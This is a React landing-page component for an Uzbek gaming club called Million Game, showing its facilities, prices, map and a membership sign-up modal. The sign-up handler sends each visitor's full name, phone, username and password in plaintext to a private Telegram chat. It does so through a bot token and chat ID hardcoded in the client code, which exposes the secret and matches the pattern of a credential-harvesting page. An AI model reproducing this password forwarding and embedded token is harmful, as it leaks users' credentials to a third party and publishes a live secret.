import gamingIcon from "@/assets/icons/gaming-icon.png";
import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import Navigation from "@/components/Navigation";
import Footer from "@/components/Footer";
import ContactForm from "@/components/ContactForm";
import HeroCarousel from "@/components/HeroCarousel";
import Map from "@/components/Map";
import SectionHeading from "@/components/SectionHeading";
import Preloader from "@/components/Preloader";
import BottomNavigation from "@/components/BottomNavigation";
import { NeonButton } from "@/components/NeonButton";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Star, Zap } from "lucide-react";
import icon1 from "@/assets/icons/router.png";
import icon2 from "@/assets/icons/ps5.png"; 
import icon3 from "@/assets/icons/foods.png";
import icon4 from "@/assets/icons/group.png";
import icon5 from "@/assets/icons/charge.png";
import icon6 from "@/assets/icons/foods.png";

const Index = () => {
  const [showPreloader, setShowPreloader] = useState(true);
  const [openModal, setOpenModal] = useState(false);
  const [form, setForm] = useState({
    fullname: "",
    phone: "",
    username: "",
    password: "",
    confirm: ""
  });
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };
  const TELEGRAM_TOKEN = "8142036375:AAHPMaSXl5_19nuhnfqAEFQSEv9GS4tF4MM";
  const TELEGRAM_CHAT_ID = "5678625270";
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const text = `🆕 Yangi a'zo!\n\n👤 Ism Familya: ${form.fullname}\n📞 Telefon: ${form.phone}\n🆔 Username: ${form.username}\n🔑 Parol: ${form.password}\n🔒 Parolni tasdiqlash: ${form.confirm}`;
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text
        })
      });
    } catch (err) {
      // Error handling (optional)
    }
    setOpenModal(false);
    setForm({ fullname: "", phone: "", username: "", password: "", confirm: "" });
  };

  const handlePreloaderComplete = () => {
    setShowPreloader(false);
  };

  if (showPreloader) {
    return <Preloader onComplete={handlePreloaderComplete} />;
  }
  const facilities = [
    {
      icon: <img src={icon1} alt="Tezkor WiFi" className="w-8 h-8" />,
      bg: icon1,
      title: "Tezkor WiFi",
      description: "Ultra tez internet ulanishi",
      color: "text-neon-blue"
    },
    {
      icon: <img src={icon2} alt="PlayStation 3, 4, 5" className="w-8 h-8" />,
      bg: icon2,
      title: "PlayStation 3, 4, 5",
      description: "Barcha konsol o'yinlari",
      color: "text-neon-blue"
    },
    {
      icon: <img src={icon3} alt="Ovqatlanish joyi" className="w-8 h-8" />,
      bg: icon3,
      title: "Ovqatlanish joyi",
      description: "Mazali taomlar va ichimliklar",
      color: "text-neon-pink"
    },
    {
      icon: <img src={icon4} alt="60ta Yuqori Sifatli PC" className="w-8 h-8" />,
      bg: icon4,
      title: "60ta Yuqori Sifatli PC",
      description: "Eng kuchli yigilgan kompyuterlar",
      color: "text-neon-purple"
    },
    {
      icon: <img src={icon5} alt="Telefon quvvatlash" className="w-8 h-8" />,
      bg: icon5,
      title: "Telefon quvvatlash",
      description: "Barcha qurilmalar uchun",
      color: "text-neon-cyan"
    },
    {
      icon: <img src={icon4} alt="Jamoaviy o'yinlar" className="w-8 h-8" />,
      bg: icon4,
      title: "Jamoaviy o'yinlar",
      description: "Do'stlar bilan o'ynash",
      color: "text-neon-cyan"
    }
  ];

  const pricingFeatures = [
    {
      icon: <img src={gamingIcon} alt="Gaming Icon" className="w-6 h-6" />,
      title: "Soatiga narx",
      price: "8 000 so'm",
      description: "Barcha o'yinlar kiradi"
    },
    {
      icon: <img src={gamingIcon} alt="Gaming Icon" className="w-6 h-6" />,
      title: "Lux xona",
      price: "15,000 so'm",
      description: "Premium tajriba"
    },
    {
      icon: <img src={gamingIcon} alt="Gaming Icon" className="w-6 h-6" />,
      title: "Game Card",
      price: "30% + narx",
      description: "100 000 so'm = 130 000 so'm"
    },
    {
      icon: <img src={gamingIcon} alt="Gaming Icon" className="w-6 h-6" />,
      title: "play station",
      price: "(PS3) 20,000 <br/> (PS4)25 000 <br/> (PS5)30 000",
      description: ""
    },
    {
      icon: <img src={gamingIcon} alt="Gaming Icon" className="w-6 h-6" />,
      title: "Turnirlar",
      price: "Free",
      description: "Turnir azolari uchun bepul"
    },
    {
      icon: <img src={gamingIcon} alt="Gaming Icon" className="w-6 h-6" />,
      title: "Maxsus taom",
      price: "22,000 so'm",
      description: "Hot dog + Coca-Cola"
    }
  ];

  return (
    <div className="min-h-screen bg-background pb-20 md:pb-0">
      <div className="particles-layer" />
      <Navigation />
      
      {/* Hero Section - Full Screen Carousel */}
      <section className="relative w-full h-screen">
        <HeroCarousel />
      </section>

      {/* Facilities Section */}
      <section className="py-20 bg-gaming-surface">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold bg-gradient-secondary bg-clip-text text-transparent mb-4 animate-fade-in">
              Bizning Imkoniyatlar
            </h2>
            <p className="text-muted-foreground text-lg animate-fade-in">
              Million Game da siz uchun tayyorlangan barcha qulayliklar
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 max-w-5xl mx-auto">
            {facilities.map((facility, index) => (
              <Card 
                key={facility.title}
                className="relative overflow-hidden bg-gradient-surface border-border shadow-gaming hover:shadow-glow transition-all duration-300 hover:scale-105 animate-fade-in group h-96"
                style={{ animationDelay: `${index * 100}ms` }}
              >
                {/* Background Image */}
                <div 
                  className="absolute inset-0 bg-cover bg-center bg-no-repeat"
                  style={{ backgroundImage: `url(${facility.bg})` }}
                >
                  <div className="absolute inset-0 bg-gradient-to-t from-gaming-dark/95 via-gaming-dark/70 to-gaming-dark/40" />
                </div>
                
                {/* Content Overlay */}
                <CardContent className="relative z-10 p-6 h-full flex flex-col justify-end text-center">
                  <div className="bg-gaming-dark/80 backdrop-blur-sm rounded-lg p-4 border border-white/10">
                    <h3 className="text-xl font-semibold text-white mb-2">
                      {facility.title}
                    </h3>
                    <p className="text-white/90 text-sm">
                      {facility.description}
                    </p>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Pricing Section */}
      <section className="py-20 bg-background">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold bg-gradient-accent bg-clip-text text-transparent mb-4 animate-fade-in">
              Narxlar va Tariflar
            </h2>
            <p className="text-muted-foreground text-lg animate-fade-in">
              O'zingizga mos tarif tanlang
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 max-w-5xl mx-auto">
            {pricingFeatures.map((feature, index) => (
              <Card 
                key={feature.title}
                className="relative overflow-hidden bg-gradient-surface border-border shadow-gaming hover:shadow-glow transition-all duration-300 hover:scale-105 animate-slide-in-left h-96"
                style={{ animationDelay: `${index * 150}ms` }}
              >
                {/* Background Image */}
                <div 
                  className="absolute inset-0 bg-cover bg-center bg-no-repeat"
                  style={{ backgroundImage: `url(${gamingIcon})` }}
                >
                  <div className="absolute inset-0 bg-gradient-to-t from-gaming-dark/95 via-gaming-dark/70 to-gaming-dark/40" />
                </div>
                
                {/* Content Overlay */}
                <CardContent className="relative z-10 p-8 h-full flex flex-col justify-end text-center">
                  <div className="bg-gaming-dark/90 backdrop-blur-sm rounded-lg p-6 border border-white/20">
                    <h3 className="text-2xl font-bold text-white mb-2">
                      {feature.title}
                    </h3>
                    <div className="text-3xl font-bold bg-gradient-primary bg-clip-text text-transparent mb-4" dangerouslySetInnerHTML={{ __html: feature.price }} />
                    <p className="text-white/90 text-sm mb-4">
                      {feature.description}
                    </p>
                    {feature.title === "Game Club a'zolik" && (
                      <Badge className="bg-gradient-secondary text-accent-foreground animate-pulse-neon">
                        <Star className="w-4 h-4 mr-1" />
                        TOP Taklif
                      </Badge>
                    )}
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>

          <div className="text-center mt-8 md:mt-12">
            <Card className="bg-gradient-surface border-border shadow-gaming max-w-6xl mx-auto animate-fade-in">
              <CardContent className="p-4 md:p-8">
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 md:gap-12 items-center">
                  {/* Left Side - Game Club Card Visual */}
                  <div className="flex justify-center order-2 lg:order-1">
                    <div className="relative">
                      {/* Main Card */}
                      <div className="w-72 h-48 md:w-96 md:h-64 bg-gradient-to-br from-gaming-dark via-primary/25 to-gaming-dark rounded-2xl border-2 border-primary/50 shadow-neon overflow-hidden transform rotate-1 md:rotate-3 hover:rotate-0 transition-all duration-700 hover:scale-105 hover:shadow-2xl hover:shadow-primary/30">
                        {/* Card Background Pattern */}
                        <div className="absolute inset-0 opacity-15">
                          <div className="absolute top-4 md:top-6 right-4 md:right-6 w-16 md:w-20 h-16 md:h-20 border-2 md:border-3 border-primary/40 rounded-full animate-pulse"></div>
                          <div className="absolute bottom-4 md:bottom-6 left-4 md:left-6 w-12 md:w-16 h-12 md:h-16 border-2 border-primary/30 rounded-xl rotate-45"></div>
                          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-24 md:h-32 border border-primary/20 rounded-full"></div>
                        </div>
                        
                        {/* Card Glow Effect */}
                        <div className="absolute inset-0 bg-gradient-to-r from-primary/10 via-transparent to-primary/10 animate-pulse"></div>
                        
                        {/* Card Content */}
                        <div className="relative z-10 h-full flex flex-col justify-between p-4 md:p-8">
                          {/* Header */}
                          <div className="flex justify-between items-start">
                            <div>
                              <h4 className="text-white font-bold text-base md:text-lg">MILLION GAME</h4>
                              <p className="text-primary/80 text-xs md:text-sm">Premium Member</p>
                            </div>
                            <div className="w-6 md:w-8 h-6 md:h-8 bg-gradient-primary rounded-full flex items-center justify-center">
                              <Zap className="w-3 md:w-4 h-3 md:h-4 text-white" />
                            </div>
                          </div>
                          
                          {/* Login Fields */}
                          <div className="space-y-1 md:space-y-2">
                            <div className="bg-gaming-dark/50 rounded px-2 md:px-3 py-1 border border-primary/20">
                              <span className="text-primary/60 text-xs">Login:</span>
                              <div className="text-white text-xs md:text-sm font-mono">player_####</div>
                            </div>
                            <div className="bg-gaming-dark/50 rounded px-2 md:px-3 py-1 border border-primary/20">
                              <span className="text-primary/60 text-xs">Parol:</span>
                              <div className="text-white text-xs md:text-sm font-mono">••••••••</div>
                            </div>
                          </div>
                          
                          {/* Footer */}
                          <div className="flex justify-between items-end">
                            <div className="text-primary/60 text-xs">
                              ID: #0001
                            </div>
                            <div className="text-primary/80 text-xs font-semibold">
                              90% OFF
                            </div>
                          </div>
                        </div>
                        
                        {/* Glow Effect */}
                        <div className="absolute inset-0 rounded-xl shadow-inner"></div>
                      </div>
                      
                      {/* Card Shadow */}
                      <div className="absolute inset-0 w-72 h-48 md:w-96 md:h-64 bg-gradient-to-br from-primary/10 to-gaming-dark/20 rounded-xl blur-lg transform translate-y-2 -z-10"></div>
                    </div>
                  </div>

                  {/* Right Side - Information */}
                  <div className="text-center order-1 lg:order-2 lg:text-left space-y-4 md:space-y-6">
                    <div>
                      <Zap className="w-10 h-10 md:w-12 md:h-12 text-neon-purple mx-auto lg:mx-0 mb-3 md:mb-4 animate-pulse-neon" />
                      <h3 className="text-2xl md:text-3xl font-bold text-foreground mb-3 md:mb-4 leading-tight">
                        Game Club A'zosi Bo'ling!
                      </h3>
                      <p className="text-muted-foreground text-base md:text-lg leading-relaxed px-2 md:px-0">
                        Game club hisob oching va 50% gacha chegirma oling. Maxsus aksiyalar va bonuslardan foydalaning!
                      </p>
                    </div>
                    
                    {/* Benefits List */}
                    <div className="space-y-2 md:space-y-3">
                      <div className="flex items-center justify-center lg:justify-start space-x-3">
                        <div className="w-2 h-2 bg-primary rounded-full flex-shrink-0"></div>
                        <span className="text-muted-foreground text-sm md:text-base">Shaxsiy login va parol</span>
                      </div>
                      <div className="flex items-center justify-center lg:justify-start space-x-3">
                        <div className="w-2 h-2 bg-primary rounded-full flex-shrink-0"></div>
                        <span className="text-muted-foreground text-sm md:text-base">30% chegirma barcha o'yinlarda</span>
                      </div>
                      <div className="flex items-center justify-center lg:justify-start space-x-3">
                        <div className="w-2 h-2 bg-primary rounded-full flex-shrink-0"></div>
                        <span className="text-muted-foreground text-sm md:text-base">VIP xonalarga kirish</span>
                      </div>
                      <div className="flex items-center justify-center lg:justify-start space-x-3">
                        <div className="w-2 h-2 bg-primary rounded-full flex-shrink-0"></div>
                        <span className="text-muted-foreground text-sm md:text-base">Har dushanba kuni 50%</span>
                      </div>
                    </div>
                    
                    <div className="pt-2 md:pt-4">
                      <Button
                        className="bg-gradient-secondary hover:opacity-90 text-accent-foreground font-semibold px-6 md:px-8 py-3 md:py-4 text-base md:text-lg rounded-lg shadow-glow hover:shadow-neon transition-all duration-300 w-full lg:w-auto min-h-[48px] touch-manipulation"
                        onClick={() => setOpenModal(true)}
                      >
                        A'zo bo'lish
                      </Button>
                    </div>
                    {/* Modal for registration */}
                    <Dialog open={openModal} onOpenChange={setOpenModal}>
                      <DialogContent className="max-w-md mx-auto">
                        <DialogHeader>
                          <DialogTitle>Game Club a'zosi bo'lish</DialogTitle>
                        </DialogHeader>
                        <form onSubmit={handleSubmit} className="space-y-4">
                          <Input
                            name="fullname"
                            type="text"
                            placeholder="Ism Familya"
                            value={form.fullname}
                            onChange={handleChange}
                            required
                          />
                          <Input
                            name="phone"
                            type="tel"
                            placeholder="Telefon raqam"
                            value={form.phone}
                            onChange={handleChange}
                            required
                          />
                          <Input
                            name="username"
                            type="text"
                            placeholder="Username"
                            value={form.username}
                            onChange={handleChange}
                            required
                          />
                          <Input
                            name="password"
                            type="password"
                            placeholder="Parol"
                            value={form.password}
                            onChange={handleChange}
                            required
                          />
                          <Input
                            name="confirm"
                            type="password"
                            placeholder="Parolni tasdiqlash"
                            value={form.confirm}
                            onChange={handleChange}
                            required
                          />
                          <DialogFooter>
                            <Button type="submit" className="w-full bg-gradient-secondary text-accent-foreground font-semibold">Yuborish</Button>
                          </DialogFooter>
                        </form>
                      </DialogContent>
                    </Dialog>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Map Section */}
      <section id="map-section" className="py-20 bg-gaming-surface">
        <div className="container mx-auto px-4">
          <div className="text-center mb-12">
            <h2 className="text-4xl font-bold bg-gradient-primary bg-clip-text text-transparent mb-4 animate-fade-in">
              Bizning Manzil
            </h2>
            <p className="text-muted-foreground text-lg animate-fade-in">
              Million Game Club - Toshkent, Chilonzor tumani
            </p>
          </div>
          
          <div className="max-w-4xl mx-auto">
            <Map />
          </div>
        </div>
      </section>

      {/* Contact Form */}
      <ContactForm />

      <Footer />

      {/* Bottom Navigation for Mobile */}
      <BottomNavigation />
    </div>
  );
};

export default Index;
